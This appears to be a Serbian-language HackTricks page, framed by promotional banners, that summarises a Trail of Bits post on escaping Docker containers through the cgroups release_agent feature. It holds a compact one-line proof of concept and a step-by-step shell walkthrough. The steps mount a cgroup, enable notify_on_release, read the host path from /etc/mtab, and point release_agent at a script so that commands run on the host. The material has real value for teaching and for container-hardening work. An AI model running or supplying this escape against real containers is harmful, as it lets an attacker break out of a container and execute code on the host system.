# Bekstvo iz cgroups-a pomoću Docker release\_agent

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraživač pokretan **dark-web**-om koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **kompromitovani** od strane **kradljivih malvera**.

Primarni cilj WhiteIntel-a je borba protiv preuzimanja naloga i napada ransomware-a koji proizilaze iz malvera za krađu informacija.

Možete posetiti njihovu veb lokaciju i isprobati njihovu mašinu za **besplatno** na:

{% embed url="https://whiteintel.io" %}

---

**Za dalje detalje, pogledajte [originalni blog post](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Ovo je samo sažetak:

Originalni PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Dokazni koncept (PoC) demonstrira metod za iskorišćavanje cgroups-a kreiranjem `release_agent` fajla i pokretanjem njegovog poziva za izvršavanje proizvoljnih komandi na hostu kontejnera. Evo detaljnog opisa koraka uključenih u postupak:

1. **Priprema Okruženja:**
- Kreiran je direktorijum `/tmp/cgrp` koji će služiti kao tačka montiranja za cgroup.
- RDMA cgroup kontroler je montiran na ovaj direktorijum. U slučaju odsustva RDMA kontrolera, predlaže se korišćenje `memory` cgroup kontrolera kao alternativa.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Postavite podgrupu:**
   - Unutar montiranog direktorijuma podgrupa se kreira pod nazivom "x".
   - Obaveštenja se omogućavaju za podgrupu "x" upisivanjem broja 1 u njen fajl notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Konfigurišite Release Agent:**
- Putanja kontejnera na domaćinu se dobija iz fajla /etc/mtab.
- Zatim se konfiguriše release_agent fajl cgroup-a da izvrši skriptu nazvanu /cmd smeštenu na dobijenoj putanji domaćina.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Kreiranje i konfigurisanje skripte /cmd:**
- Skripta /cmd se kreira unutar kontejnera i konfiguriše se da izvrši ps aux, preusmeravajući izlaz u datoteku nazvanu /output u kontejneru. Specifikovan je puni put do /output na domaćinu.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Pokrenite napad:**
- Proces je pokrenut unutar "x" pod-cgroup-a i odmah je završen.
- Ovo pokreće `release_agent` (skriptu /cmd), koja izvršava ps aux na hostu i zapisuje izlaz u /output unutar kontejnera.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraživač pokretan **dark web-om** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **ugroženi** od **malvera koji krade podatke**.

Njihov primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomvera koji proizilaze iz malvera koji krade informacije.

Možete posetiti njihovu veb lokaciju i isprobati njihov pretraživač **besplatno** na:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA ČLANSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
